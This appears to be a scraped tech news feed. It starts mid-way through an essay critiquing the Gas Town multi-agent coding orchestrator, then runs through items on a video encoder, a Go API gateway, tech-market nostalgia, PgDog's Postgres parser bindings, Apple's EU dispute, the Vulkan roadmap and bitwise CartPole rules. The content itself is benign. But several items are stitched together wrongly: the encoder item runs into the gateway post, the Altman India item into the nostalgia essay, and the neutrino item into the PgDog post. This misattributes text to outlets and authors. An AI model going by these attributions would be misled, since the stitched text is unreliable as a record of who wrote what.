bunch of bullshit I pulled out of my arse over the past 3 weeks, and I named it after badgers and stuff.” It was slapdashed together over “17 days, 75k lines of code, 2000 commits. It finally got off the ground (GUPP started working) just 2 days ago.”This Hacker News     describes the problem well, and points out that Yegge’s previous     project, of which Gas Town is an extension, suffers the same issue:“Beads is a good idea with a bad implementation. It’s not a designed product in the sense we are used to, it’s more like a stream of consciousness converted directly into code. It’s a program that isn’t only vibe coded, it was vibe designed too.”“Gas Town is clearly the same thing multiplied by ten thousand. The number of overlapping and ad hoc concepts in this design is overwhelming. Steve is ahead of his time but we aren’t going to end up using this stuff. Instead a few of the core insights will get incorporated into other agents in a simpler but no less effective way.”“gas town [is] such a nightmare to use i love it… the mayor is dumb as rocks the witness regularly forgets to look at stuff the deacon makes his own rules the crew have the object permanence of a tank full of goldfish and the polecats seem intent on wreaking as much chaos on the project as they can. this is peak entertainment i swear”Friends and colleagues of mine who have been brave enough to try out Gas Town in more depth report the same thing; this thing fits the shape of Yegge’s brain and no one else’s. I’d categorise that as a moderate design fail, given this is a public product that I assume Yegge wants  people to try out. The onboarding is baptism by fire.This feels like one of the most critical, emerging footguns of liberally hands-off agentic development. You can move so fast you never stop to think. It is so easy to prompt, you don’t fully consider what you’re building at each step of the process. It is only once you are hip-deep in poor architectural decisions, inscrutable bugs, and a fuzzy memory of what you set out to do, do you realise you have burned a billion tokens in exchange for a pile of hot trash.2. Buried in the chaos are sketches of future agent orchestration patternsNow that I’ve just critiqued the design of Gas Town, I will turn around and say that while the current amalgamation of polecats, convoys, deacons, molecules, protomolecules, mayors, seances, hooks, beads, witnesses, wisps, rigs, refineries, and dogs is a bunch of under cooked spaghetti, Yegge’s patterns  sketch out some useful conceptual shapes for future agentic systems.If you step back and squint, this mishmash of concepts reveals a few underlying patterns that future agentic systems will likely follow:Agents have specialised roles with hierarchical supervisionEvery agent in Gas Town has a permanent, specialised role. When an agent spins up a new session, it knows who it is and what job it needs to do. Some examples: is the human concierge: it’s the main agent you talk to. It talks to all the other agents for you, kicking off work, receiving notifications when things finish, and managing the flow of production. are temporary grunt workers. They complete single, isolated tasks, then disappear after submitting their work to be merged. supervises the Polecats and helps them get unstuck. Its job is to solve problems and nudge the proletariat workers along. manages the merge queue into the main branch. It evaluates each piece of work waiting to be merged, resolving conflicts in the process. It can creatively “re-imagine” implementations if merge conflicts get too hairy, while trying to keep the intent of the original work.There are many more characters in this town, but these give you a flavour of the system. Giving each agent a single job means you can prompt them more precisely, limit what they’re allowed to touch, and run lots of them at once without them stepping on each other’s toes.There’s also a clear chain of command between these agents. You talk to the Mayor, who coordinates work across the system. The Mayor in Gas Town never writes code. It talks to you, then creates work tasks and assigns them to workers. A set of system supervisors called the Witness, the Deacon, and “Boot the Dog” intermittently nudge the grunt workers and each other to check everyone is doing their work. Oh and there’s also a crew of “dogs” who do maintenance and cleaning.It’s easier if I try and show you. Here’s the basic relationship structure of Gas Town, as best I can make out:Since I’m making my own visuals here, I should justify it by pointing out that while Yegge made lots of his own ornate, zoopmorphic diagrams of Gas Town’s architecture and workflows, they are unhelpful. Primarily because they were made entirely by Gemini’s    . And while Nano Banana is state-of-the-art at making diagrams, generative AI systems are still really shit at making illustrative diagrams. They are very hard to decipher, filled with cluttered details, have arrows pointing the wrong direction, and are often missing key information. Case in point:Does this help you understand how the system works? No? No.Gas Town’s hierarchical approach solves both a coordination and attention problem. Without it, you are the one assigning tasks to dozens individual agents, checking who’s stuck, who’s idle, and who’s waiting on work from someone else. With the Mayor as your single interface, that overhead disappears. You can continuously talk to the Mayor without interrupting any agents or getting in the way, or having to think much about which one is doing what. This is less cognitive overhead than constantly switching tabs between Claudes.I think there’s a lot of opportunity to diversify the cast of characters here and make more use of    . The agents in Gas Town are all generalist workers in the software development pipeline. But we could add in any kind of specialist we want: a dev ops expert, a product manager, a front-end debugger, an accessibility checker, a documentation writer. These would be called in on-demand to apply their special skills and tools.Agent roles and tasks persist, sessions are ephemeralOne of the major limitations of current coding agents is running out of context. Before you even hit the limits of a context window,     degrades the output enough that it’s not worth keeping. We constantly have to compact or start fresh sessions.Gas Town’s solution to this is make each agent session disposable by design. It stores the important information – agent identities and tasks – in Git, then liberally kills off sessions and spins up fresh ones when needed. New sessions are told their identity and currently assigned work, and continue on where the last one left off. Gas Town also lets new sessions ask their predecessors what happened through “seancing”: resuming the last session as a separate instance in order to let the new agent ask questions about unfinished work.This saving and recalling is all done through Gas Town’s “Beads” system.  Beads are tiny, trackable units of work – like issues in an issue tracker – stored as JSON in Git alongside your code. Each bead has an ID, description, status, and assignee. Agent identities are also stored as beads, giving each worker a persistent address that survives session crashes.Yegge didn’t invent this pattern of tracking atomic tasks outside agent memory in something structured like JSON. Anthropic described the same approach in their research on    , just published in November 2025. I give it a hot minute before this type of task tracking lands in Claude Code.Feeding agents continuous streams of workThe whole promise of an orchestration system like Gas Town is it’s a perpetual motion machine. You give high-level orders to the mayor, and then a zoo of agents kicks off to break it down into tasks, assign them, execute them, check for bugs, fix the bugs, review the code, and merge it in.Each worker agent in Gas Town has its own queue of assigned work and a “hook” pointing to the current thing they should be doing. The minute they finish a task, the next one jumps to the front of the queue. The mayor is the one filling up these queues – it’s in charge of breaking down large features into atomic tasks and assigning them to available workers. In theory, the workers are never idle or lacking tasks, so long as you keep feeding the mayor your grand plans.This principle of “workers always do their work” is better in theory than practice. It turns out to be slightly difficult to make happen because of the way current models are trained. They’re designed as helpful assistants who wait politely for human instructions. They’re not used to checking a task queue and independently getting on with things.Gas Town’s patchwork solution to this is aggressive prompting and constant nudging. Supervisor agents spend their time poking workers to see if anyone’s stalled out or run dry on work. When one goes quiet, they send it a ping which jolts the agent into checking its queue and getting back to work. These periodic nudges move through the agent hierarchy like a heartbeat keeping everything moving. This is a decent band-aid for the first version, but more serious efforts at agent orchestration systems will need reliable ways to keep agents on task.Merge queues and agent-managed conflictsWhen you have a bunch of agents all working in parallel, you’re of course going to run into merge conflicts. Each agent is off on its own branch, and by the time it finishes its task, the main branch might look completely different – other changes have landed, the code has moved on. The later an agent finishes, the worse this gets. Normally you, the human, takes on the burden of sorting out the mess and deciding which changes to keep. But if agents are running on their own, something has to do that job for them.So Gas Town has a dedicated merge agent – the Refinery – that works through the merge queue one change at a time. It looks at each merge request, resolves any conflicts, and gets it into main. When things get really tangled – when so much has changed that the original work doesn’t even make sense anymore – it can creatively “re-imagine” the changes: re-doing the work to fit the new codebase. Or escalate to a human if needed.But there’s another way to sidestep merge conflict nightmares that Gas Town doesn’t have built in: ditch PRs for    . The traditional git workflow puts each feature on its own branch for days or weeks, accumulating commits, then getting merged back as one chunky PR.Stacked diffs avoid this conflict-prone approach by breaking work into small, atomic changes that each get reviewed and merged on their own, building on top of each other. Every change gets its own branch, forked off the previous change, forming a “stack” of changes dependent on one another. When a change earlier in the stack gets updated, all the changes below it automatically rebase on top of the new version.This fits how agents naturally work. They’re already producing tiny, focused changes rather than sprawling multi-day branches. When conflicts do pop up, they’re easier to untangle because each diff touches less code.    ’s recent acquisition of    , a tool built specifically for stacked diff workflows, suggests I am not the only one who sees this opportunity. When you’ve got dozens of agents landing changes continuously, you need tools and interfaces specifically designed for these frequent, incremental merges.3. The price is extremely high, but so is the (potential) valueYegge describes Gas Town as “expensive as hell… you won’t like Gas Town if you ever have to think, even for a moment, about where money comes from.” He’s on his second Claude account to get around Anthropic’s spending limits.I can’t find any mention online of the per-account limits, but let’s conservatively assume he’s spending at least $2,000 USD per month, and liberally $5,000.The current cost is almost certainly artificially inflated by system inefficiency. Work gets lost, bugs get fixed numerous times, designs go missing and need redoing. As models improve and orchestration patterns mature, the cost of orchestrators like this should drop while output quality rises.I expect companies would happily pay around the $1-3k/month mark for a sane, understandable, higher quality, and lower waste version of Gas Town. Maybe that sounds absurd to you, given we’ve all become anchored to the artificially low rate of $100-200/month for unlimited usage by the major providers. But once the AI bubble pops, the VC funds dry up, and providers have to charge the true cost of inference at scale, we should expect that “unlimited” tier to look a lot pricier.Even when that comes to pass, a few thousand is pretty reasonable when you compare it to an average US senior developer salary: $120,000 USD.  If Gas Town could genuinely speed up the work of a senior developer by 2-3x or more, it would easily be worth 10-30% of their salary. The cost per unit of valuable work starts to look competitive with human labour.Annual cost as a percentage of developer salaryThe maths on paying for something like this is already defensible in wealthier places like the US and parts of Western Europe. In spots where developer salaries are lower, we would expect the budget for AI assisted tools adjusts accordingly. They’ll get less crazy scaled automation and more conservative usage with humans filling in the cognitive gaps.4. Yegge never looks at code. When should we stop looking too?Yegge is leaning into the true definition of     with this project: “It is 100% vibecoded. I’ve never seen the code, and I never care to.” Not looking at code  is a very bold proposition, today, in January 2026.Given the current state of models and the meagre safeguards we have in place around them, the vast majority of us would consider this blind coding approach irresponsible and daft to do on anything that isn’t a throwaway side project. Which, given the amount of effort and Claude tokens Yegge has sunk into building it, writing documentation, and publicly promoting it, Gas Town is not.“Should developers still look at code?” will become one of the most divisive and heated debates over the coming years. You might be offended by the question, and find it absurd anyone is asking. But it’s a sincere question and the answer will change faster than you think.I’m already seeing people divide along moralistic, personal identity lines as they try to answer it. Some declare themselves purist, AI sceptic, Real Developers who check every diff and hand-adjust specific lines, sneering at anyone reckless enough to let agents run free. While others lean into agentic maximalism, directing fleets from on high and pitying the mass of luddites still faffing about with manual edits like it’s 2019. Both camps mistake a contextual judgement for a personality trait and firm moral position.A more conservative, easier to consider, debate is: how  should the code be in agentic software development tools? How easy should it be to access? How often do we expect developers to edit it by hand?Interfaces like    ,    , and     do not put code front and centre in the experience. The agent is your first and primary interface. You might be able to see diffs rolls by or display code files inline, but you can’t touch them. Trying to edit code yourself is a roundabout journey of opening your IDE and navigating to the correct files and lines.This design choice assumes it is easier to ask an agent to make the change for you, than it is to type it out the syntax yourself. They clearly say “we don’t believe users need to touch code.”Framing this debate as an either/or – either you look at code or don’t, either you edit code by hand or you exclusively direct agents, either you’re the anti-AI-purist or the agentic-maxxer – is unhelpful. Because nothing is a strict binary.The right distance isn’t about what kind of person you are or what you believe about AI capabilities in the current moment. How far away you step from the syntax shifts based on what you’re building, who you’re building with, and what happens when things go wrong. The degree of freedom you hand over to agents depends on:Domain and programming languageFront-end versus backend makes a huge difference. Language is a poor medium for designing easing curves and describing aesthetic feelings – I always need to touch the CSS, and it’s often faster to just tweak directly than try to explain what I want. Yegge’s CLI tooling is much easier to validate with pass/fail tests than evaluating whether a notification system “feels calm enough”. Model competence also varies wildly by language; prompting React and Tailwind gives you much better results than Rust or Haskell, where the models still regularly choke on borrow checkers and type systems.Access to feedback loops and definitions of successThe more agents can validate their own work, the better the results. If you let agents run tests and see the output, they quickly learn what’s broken and how to fix it. If you let them open browsers, take screenshots, and click around, they can spot their mistakes. Tools like the     lean into this – it loops until tests pass or some specific condition is validated. This doesn’t work for less defined, clear cut work though. If you try to make an agent design a visual diagram for you, it’s going to struggle. It doesn’t know your aesthetic preferences and can’t really “see” what it’s making.Risk tolerance for shit going wrongStakes matter. If an agent breaks some images on your personal blog, you’ll recover. But if you’re running a healthcare system where a bug could miscalculate drug dosages, or a banking app moving actual money around, you can’t just wave an agent at it and hope. Consequences scale up fast. Corporate software has people whose entire job is compliance and regulatory sign-off – they need to see the code, understand it, verify it meets requirements. Those people aren’t going to let you wildly run Gas Town over projects without serious guardrails in place.“Gas Town sounds fun if you are accountable to nobody: not for code quality, design coherence or inferencing costs. The rest of us are accountable for at least the first two and even in corporate scenarios where there is a blank check for tokens, that can’t last. So the bottleneck is going to be how fast humans can review code and agree to take responsibility for it.”Greenfield vs. brownfield projectsStarting fresh (greenfield), means you can let agents make architectural decisions and establish patterns – if you don’t like them, you can easily throw it out and restart. The cost of mistakes is low. But in an existing codebase (brownfield) with years of accumulated conventions, implicit patterns, and code that exists for reasons nobody remembers anymore, agents need much tighter supervision. They’ll happily introduce a new pattern that contradicts the three other ways this codebase already solves the same problem.If you’re solo of course you can YOLO. If you’re working with more than a handful of people, you’ll have to agree on coding standards and agent rules. This creates its own overhead: updating the AGENTS.md file, picking MCPs, writing commands and skills and rules and whatever else we invent to constrain these things. The pace of change when you’re all using agents can be overwhelming and you need to figure out a sensible reviewing pipeline to manage it. Team coordination can fall apart when everyone’s agents start moving too fast. You might show up in the morning and discover someone’s agent renamed the database schema while another agent refactored the whole API layer, and neither of which jive with your giant, unmerged feature.More senior developers can prompt better, debug better, and setup more stringent preferences earned through decades of seeing what can go wrong in scaled, production environments. They can recognise patterns: “oh, that’s a memory leak” or “that’s going to deadlock under load.” Newer developers don’t have that catalogue of failures yet and are much more likely to prompt their own personal house of cards. The tests might pass and everything looks fine until you hit production traffic or someone enters a weird character. It is hard to defend against unknown unknowns.Given all these “it depends” considerations, I’m currently in the code-must-be-close camp for most serious work done by professional developers. But I expect I’ll shift to the code-at-a-distance camp over the next year or two as the harnesses and tools we wrap around these agents mature. If we can ship them with essential safe guards and quality gates, the risks drop. Sure, the models will also improve, but the infrastructure matters far more: validation loops, tests, and specialised subagents who focus on security, debugging, and code quality are what will make code-at-a-distance feasible.We have many, continuous versions of the code distance debate internally at    . One of the projects within the team driving this is     – autonomous agents run through GitHub Actions in response to events: new PRs, new issues, or specific times of day. Every commit can trigger a security review agent, an accessibility audit, and a documentation updater, all running in parallel alongside traditional CI/CD tests before anything lands in main. The team building it rarely touches code and do most of their work by directing agents from their phones. It’s these kinds of guardrails that makes a hands-off Sim-City-esque orchestrator system feel less terrifying to me.I don’t believe Gas Town itself is “it”. It’s not going to evolve into the thing we all use, day in and day out, in 2027. As I said, it’s a provocative piece of speculative design, not a system many people will use in earnest. In the same way any poorly designed object or system gets abandoned, this manic creation is too poorly thought through to persist. But the problems it’s wrestling with and the patterns it has sketched out will unquestionably show up in the next generation of development tools.As the pace of software development speeds up, we’ll feel the pressure intensify in other parts of the pipeline: thoughtful design, critical thinking, user research, planning and coordination within teams, deciding what to build, and whether it’s been built well. The most valuable tools in this new world won’t be the ones that generate the most code fastest. They’ll be the ones that help us think more clearly, plan more carefully, and keep the quality bar high while everything accelerates around us.]]></content:encoded></item><item><title>VVenC H.266 Encoder Rolls Out More ARM Optimizations For Nice Performance Gains</title><link>https://www.phoronix.com/news/VVenC-1.14-More-ARM-Performance</link><author>Michael Larabel</author><category>tech</category><pubDate>Fri, 23 Jan 2026 16:08:22 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[Fraunhofer HHI this week released a new version of VVenC, their open-source H.266 video encoder.

It’s called GONK and it’s an API gateway implemented in Go that aims to be simple, efficient, and practical for scenarios where heavier solutions feel overkill.GONK is a lightweight API gateway designed to handle routing, authentication, load balancing and related concerns in front of backend services. It is built to work even in environments with limited resources or without cloud dependencies, such as air-gapped networks, industrial setups and edge devices. ￼• Authorization with role-based access control and JWT scope validation. ￼ • mTLS support with client certificate authentication and flexible role mapping. ￼ • Load balancing across multiple upstreams with strategies like round-robin, weighted, least-connections and IP hash. ￼ • Health checking and automatic failover for upstreams. ￼ • A CLI tool that helps generate configuration, JWTs and certificates without manual YAML editing. ￼ • Single binary deployment with no external dependencies. ￼ Traditional API gateways such as Kong, Traefik or NGINX are powerful but often come with complexity, external dependencies, or assumptions about cloud infrastructure that don’t fit well in offline or resource-limited environments. With GONK, I wanted a gateway that brings essential gateway features together in a small footprint that can run where you need it without heavy infrastructure. ￼You can clone the repository, build the binaries and start with a basic configuration template:./bin/gonk-cli init --template basic --output gonk.yaml./bin/gonk -config gonk.yamlI’m looking for feedback, especially from people working on IoT, edge computing or systems without reliable access to centralized services. Is this approach to authorization and gateway design practical? What features would make it more useful in real deployments?]]></content:encoded></item><item><title>OpenAI chief Sam Altman plans India visit as AI leaders converge in New Delhi: sources</title><link>https://techcrunch.com/2026/01/23/openai-chief-sam-altman-plans-india-visit-as-ai-leaders-converge-in-new-delhi-sources/</link><author>Jagmeet Singh</author><category>tech</category><pubDate>Fri, 23 Jan 2026 15:30:09 +0000</pubDate><source url="https://techcrunch.com/">TechCrunch</source><content:encoded><![CDATA[The visit comes as New Delhi prepares to host a major AI summit expected to draw top executives from Meta, Google, and Anthropic.

We went from paper maps to GPS (which itself evolved from DVDs with static maps to internet-connected real-time navigation). CD players became MP3 players, then streaming services. We had Palm Pilots and early attempts at “smart” phones, which were anything but. Our computers could search for extraterrestrial life through SETI. We emerged from the pager era to portable phones to the entire internet in our pocket (which evolved from charging per SMS or megabyte to unlimited data plans).We went through what I still think of as a golden era of console gaming: the N64 & PlayStation, then PS2, Xbox, and GameCube. Meanwhile, our bulky CRT monitors became flat (with a misadventure toward “projection” TVs in between). We could buy gadgets for everything. Best Buy and RadioShack felt like amusement parks we’d visit without intention, ready to be drawn in by something new. A trip to Asia’s electronics stores felt like a genuine step into the future.Today, we have everything we did back then, and much more. And yet it somehow feels like we’ve been left with less.In the early 2000s, tech began a decades-long consolidation. Almost everything we used before became a function of a single device. Objectively, this was an improvement—old VCR interfaces were awful, early MP3 players were clunky, GPS lacked real-time traffic data, and nothing talked to each other. And yet, through that consolidation, something intangible was taken from us.Our devices lost their unique personalities. Phones became our alarm clocks, flashlights, calendars, watches, cameras, GPS units, music players, radios, journals, and gaming devices—all at once. We betrayed our focus in the pursuit of convenience, and the personality of our devices for homogeneity.The benefits were clear to us, but the costs weren’t.This convergence created winner-take-all (and two-player) markets. Console gaming became PlayStation or Nintendo. Phones became Android or iOS. Computers became Mac or Windows. PC gaming became synonymous with Steam. Everything else became a feature inside one of those platforms, with globally synchronized updates making our experiences increasingly uniform, and bland.For a long time, that felt inevitable. But it’s only become clear in retrospect that somewhere in the early 2020s, things started to change.New paradigms are emerging for the first time since mobile. VR is no longer experimental. Early AR is starting to reach consumers. Meta shipped a wearable that normal people actually use, thanks to a clever Ray-Ban partnership (and associated equity stake). 3D printers have become real household products. Wearables are diversifying—smart rings, over-the-counter glucose monitors, connected beds.Meanwhile, Apple’s aggressive push for services revenue has alienated developers and users alike, creating space for alternatives. And nostalgia has revealed itself as massive, underserved economic demand.Gen-Z is buying single-purpose iPods and wired headphones. Pokémon cards are trendy. My friends and I are amassing N64 game collections again. There is a revived appetite for film cameras and Polaroids. Companies are recreating old hardware in modern form—ModRetro’s upcoming FPGA-based M64 plays native N64 cartridges, following their successful Game Boy recreation. They’re now working to bring a “next-gen” CRT monitor to market. The Playdate proved there’s still room for third-party handhelds with their own unique philosophies. Even Nintendo couldn’t resist capitalizing with the re-release of their classic consoles.Design matters again. In our devices, and in our lives. Art Deco is in vogue. Cyberpunk has never been more culturally mainstream. Color is back, and bold.Canon, Sony, and Nikon may have replaced Kodak for professionals, but Leica is thriving again and Kodak Instamatic has gone viral. People want devices that feel personal—leather finishes, physical controls, intentional constraints. For years this expression was limited to phone cases. Now it’s showing up in hardware itself.Tech is starting to resemble the wristwatch market: collaborations, limited editions, exclusivity. A market with many players—emerging companies, niche studios, design-forward brands, and even failing companies—is healthier than one dominated by a few giants.Antitrust pressure has slowed consolidation, opened app distribution, killed the anti-competitive iMessage and AirDrop moats, and made big tech cautious about horizontal expansion. And yet market forces may matter even more. Subscriptions keep multiplying. Advertising creeps into everything. Consolidated platforms are becoming bloated, degrading experiences. Platforms extract value in ways that betray their original philosophies.Apple’s push toward services has been financially successful but culturally damaging. Users are looking elsewhere. It was imperceptible at first, but that sentiment is spreading.Barriers to entry are lower than they’ve been in decades. Software can be deployed in minutes. Hardware is still hard, but 3D printing has revolutionized prototyping and accessible manufacturing services have drastically lowered the cost and time to market. Even the consolidation on the USB-C standard has played a role, allowing switching devices without investing in a new ecosystem.We’ve also grown tired of curation by algorithm. What we watch is shaped by recommendation engines. How we perceive it is influenced by aggregate ratings. I miss wandering through video stores, choosing based on nothing more than a cover. Discovery felt accidental and my opinions felt like my own.Burnout plays a role too. A Timex ad went viral this year: “Know the time without seeing you have 1,249 unanswered emails.” People are gravitating toward rigid, single-purpose experiences that let them fully disengage.Our appetite for alternatives has grown, while they’ve also become easier to create. LLMs and modern tools have lowered the effort required to build things. Side projects are easier to start and finish. Even when large companies offer better experiences on paper, individuals are building alternatives for the joy of it. Some go viral. Consumers end up with more choice.Nothing would have been harder to project than the growth of Linux on the desktop. Integrated platforms seemingly made the Linux philosophy untenable, and yet it may now be growing as a direct result of this decoupling. This was a feature, not a bug.Looking at my own purchases from 2025, the pattern becomes obvious:TRMNL (a no-distraction e-paper display)Android Pixel Pro (alongside iPhone)ASUS ROG laptop (for CUDA and gaming)Govee programmable lightsBambu Labs P1S 3D printerKindle (finally retiring my last mini-USB device)Abbott Lingo glucose sensoriPad (single-purpose: as a second MacBook display while traveling)More mechanical watches than I can count (while not tech per se, it does reduce the breadth of the Apple ecosystem)This is more than I’ve bought in the last 5 years, and I’m already excited for 2026. While Meta, Apple, Amazon, and Google still appear in my list, their purposes are narrower for me than in the past, and their presence is often no longer part of a two-player market. To be clear, these companies often make great products that should exist, but they should be easy to use as standalone à la carte offerings, not forced omakase experiences.We’ll never truly recreate the late 80s or mid-90s. SaaS, subscription pricing, and centralized platforms are here to stay. But this feels like the beginning of another golden era—one defined less by consolidation and more by variety, personality, and choice.]]></content:encoded></item><item><title>Monster Neutrino Could Be a Messenger of Ancient Black Holes</title><link>https://www.quantamagazine.org/monster-neutrino-could-be-a-messenger-of-ancient-black-holes-20260123/</link><author>Jonathan O&apos;Callaghan</author><category>Quanta Magazine</category><category>tech</category><enclosure url="https://www.quantamagazine.org/wp-content/uploads/2026/01/Black-Holes-as-Dark-Matter-cr-Courtesy-of-KM3NeT-Default.webp" length="" type=""/><pubDate>Fri, 23 Jan 2026 15:26:07 +0000</pubDate><source url="https://www.quantamagazine.org/">Quanta Magazine</source><content:encoded><![CDATA[Nearly three years ago, a particle from space slammed into the Mediterranean Sea and lit up the partially complete Cubic Kilometer Neutrino Telescope (KM3NET) detector off the coast of Sicily.

Under the hood, we use  to parse and understand SQL queries. Since PgDog is written in Rust, we use its Rust bindings to interface with the core C library. 
Those bindings use Protobuf (de)serialization to work uniformly across different programming languages, e.g., the popular Ruby  gem.Protobuf is fast, but not using Protobuf is faster. We forked  and replaced Protobuf with direct C-to-Rust (and back to C) bindings, using bindgen and Claude-generated wrappers. This resulted in a 5x improvement in parsing queries, and a 10x improvement in deparsing (Postgres AST to SQL string conversion).You can reproduce these by cloning our fork and running the benchmark tests: (Protobuf) (Direct C to Rust) (Protobuf) (Direct Rust to C)The first step is always profiling. We use samply, which integrates nicely with the Firefox profiler. Samply is a sampling profiler: it measures how much time code spends running CPU instructions in each function. It works by inspecting the application call stack thousands of times per second. The more time is spent inside a particular function (or span, as they are typically called), the slower that code is. This is how we discovered :This is the entrypoint to the  C library, used by all  bindings. The function that wraps the actual Postgres parser, , barely registered on the flame graph. Parsing queries isn’t free, but the Postgres parser itself is very quick and has been optimized for a long time. With the hot spot identified, our first instinct was to do nothing and just add a cache.Caching is a trade-off between memory and CPU utilization, and memory is relatively cheap (latest DRAM crunch notwithstanding). The cache is mutex-protected, uses the LRU algorithm and is backed by a hashmap. The query text is the key and the Abstract Syntax Tree is the value, which expects most apps to use prepared statements. The query text contains placeholders instead of actual values and is therefore reusable, for example:While the  parameter can change between invocations, the prepared statement does not, so we could cache its static AST in memory.This works pretty well, but eventually we ran into a couple of issues:Some ORMs can have bugs that generate thousands of unique statements, e.g.,  instead of , which causes a lot of cache missesApplications use old PostgreSQL client drivers which don’t support prepared statements, e.g., Python’s  packageThe clock on Protobuf was ticking and we needed to act. So, like a lot of engineers these days, we asked an LLM to just do it for us.I’m going to preface this section by saying that the vast majority of PgDog’s source code is written by a human. AI is not in a position to one-shot a connection pooler, load balancer and database sharder. However, when scoped to a very specific, well-defined and most importantly  task, it can work really well.The prompt we started with was pretty straightforward:libpg_query is a library that wraps the PostgreSQL parser in an API. pg_query.rs is a Rust wrapper around libpg_query which uses Protobuf for (de)serialization. Replace Protobuf with bindgen-generated Rust structs that map directly to the Postgres AST.And after two days of back and forth between us and the machine, it worked. We ended up with 6,000 lines of recursive Rust that manually mapped C types and structs to Rust structs, and vice versa. We made the switch for ,  (used in our new query rewrite engine, which we’ll talk about in another post),  and . These four methods are heavily used in PgDog to make sharding work, and we immediately saw a 25% improvement in  benchmarks.Just to be clear: we had a lot of things going for us already that made this possible. First,  has a Protobuf spec for  (and Prost, the Protobuf Rust implementation) to generate bindings, so Claude was able to get a comprehensive list of structs it needed to extract from C, along with the expected data types.Second,  was already using bindgen, so we had to just copy/paste some invocations around to get the AST structs included in bindgen’s output.And last, and definitely not least,  already had a working  and  implementation, so we could test our AI-generated code against its output. This was entirely automated and verifiable: for each test case that used , we included a call to , compared their results and if they differed by even one byte, Claude Code had to go back and try again.The translation code between Rust and C uses  Rust functions that wrap Rust structs to C structs. The C structs are then passed to the Postgres/ C API which does the actual work of building the AST.The result is converted back to Rust using a recursive algorithm: each node in the AST has its own converter function which accepts an  C pointer and returns a safe Rust struct. Much like the name suggests, the AST is a tree, which is stored in an array:For each node in the list, the implementation calls , which then handles each one of the 100s of tokens available in the SQL grammar:For nodes that contain other nodes, we recurse on  again until the algorithm reaches the leaves (nodes with no children) and terminates. For nodes that contain scalars, like a number (e.g., ) or text (e.g., ), the data type is copied into a Rust analog, e.g.,  or .The end result is , a Rust struct generated by Prost from the  API Protobuf specification, but populated by native Rust code instead of Prost’s deserializer. Reusing existing structs reduces the chance of errors considerably: we can compare  and  outputs, using the derived  trait, and ensure that both are identical, in testing.While recursive algorithms have a questionable reputation in the industry because bad ones can cause stack overflows, they are very fast. Recursion requires no additional memory allocation because all of its working space, the stack, is created on program startup. It also has excellent CPU cache locality because the instructions for the next invocation of the same function are already in the CPU L1/L2/L3 cache. Finally and arguably more importantly, they are just easier to read and understand than iterative implementations, which helps us, the humans, with debugging.Just for good measure, we tried generating an iterative algorithm, but it ended up being slower than Prost. The main cause (we think) was unnecessary memory allocations, hashmap lookups of previously converted nodes, and too much overhead from walking the tree several times. Meanwhile, recursion processes each AST node exactly once and uses the stack pointer to track its position in the tree. If you have any ideas on how to make an iterative algorithm work better, let us know!Reducing the overhead from using the Postgres parser in PgDog makes a huge difference for us. As a network proxy, our budget for latency, memory utilization, and CPU cycles is low. After all, we aren’t a real database…yet! This change improves performance from two angles: we use less CPU and we do less work, so PgDog is faster and cheaper to run.If stuff like this is interesting to you, reach out. We are looking for a Founding Software Engineer to help us grow and build the next iteration of horizontal scaling for PostgreSQL.]]></content:encoded></item><item><title>Apple Accuses European Commission of &apos;Political Delay Tactics&apos; To Justify Fines</title><link>https://apple.slashdot.org/story/26/01/23/0941249/apple-accuses-european-commission-of-political-delay-tactics-to-justify-fines?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>msmash</author><category>tech</category><pubDate>Fri, 23 Jan 2026 15:21:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[Apple has accused the European Commission of using "political delay tactics" to postpone new app marketplace policies and create grounds for investigating and fining the iPhone maker, a preemptive response to reports that the commission plans to blame Apple for the announced closure of third-party app store Setapp. 

MacPaw, the developer behind Setapp, said it would shut down the marketplace next month because of "still-evolving and complex business terms that don't fit Setapp's current business model." The EC is preparing to say that Apple has not rolled out changes to address key issues concerning its business terms and their complexity, according to remarks seen by Bloomberg. 

Apple said it disputes this finding. The company said it submitted a formal compliance plan in October proposing to replace its $0.59 per-install fee structure with a 5% revenue share, but the commission has not responded. "The European Commission has refused to let us implement the very changes that they requested," Apple said. The company also claimed there is no demand in the EU for alternative app stores and disputed that Setapp is closing because of its actions.]]></content:encoded></item><item><title>Vulkan Roadmap 2026 Milestone: Variable Rate Shading, Host Image Copies &amp; More</title><link>https://www.phoronix.com/news/Vulkan-Roadmap-2026</link><author>Michael Larabel</author><category>tech</category><pubDate>Fri, 23 Jan 2026 15:12:32 +0000</pubDate><source url="https://www.phoronix.com/">Phoronix</source><content:encoded><![CDATA[In addition to the release today of Vulkan 1.4.340 with the new descriptor heap "VK_EXT_descriptor_heap" extension and three other new extensions, The Khronos Group's Vulkan Working Group has also published the Vulkan Roadmap 2026 Milestone...]]></content:encoded></item><item><title>[R] I solved CartPole-v1 using only bitwise ops with Differentiable Logic Synthesis</title><link>https://www.reddit.com/r/MachineLearning/comments/1qktalg/r_i_solved_cartpolev1_using_only_bitwise_ops_with/</link><author>/u/kiockete</author><category>ai</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 15:08:44 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[Yeah I know Cart Pole is easy, but I basically distilled the policy down to just bitwise ops on raw bits.The entire logic is exactly 4 rules discovered with "Differentiable Logic Synthesis" (I hope this is what I was doing):rule1 = (angle >> 31) ^ 1 rule2 = (angular >> 31) ^ 1 rule3 = ((velocity >> 24) ^ (velocity >> 23) ^ (angular >> 31) ^ 1) & 1 rule4 = (rule1 & rule2) | (rule1 & rule3) | (rule2 & rule3) It treats the raw IEEE 754 bit-representation of the state as a boolean (bit) input vector, bypassing the need to interpret them as numbers.This is small research, but the core recipe is:Have a strong teacher (already trained policy) and treat it as data generator, because the task is not to learn the policy, but distill it to a boolean functionUse Walsh basis (parity functions) for boolean function approximationTrain soft but anneal the temperature to force discrete "hard" logicPrune the discovered Walsh functions to distill it even further and remove noise. In my experience, fewer rules actually increase performance by filtering noiseThe biggest challenge was the fact that the state vector is 128 bits. This means there are 2^128 possible masks to check. That's a huge number so you can't just enumerate and check them all. One option is to assume that the solution is sparse. You can enforce sparsity by either some form of regularization or structurally (or both). We can restrict the network to look only at most at K input bits to calculate the parity (XOR).Turns out it works, at least for Cart Pole. Basically it trains under a minute on consumer GPU with code that is not optimized at all.Here are the 32 lines of bitwise controller. If you have gymnasium installed you can just copy-paste and run:import struct import gymnasium as gym def 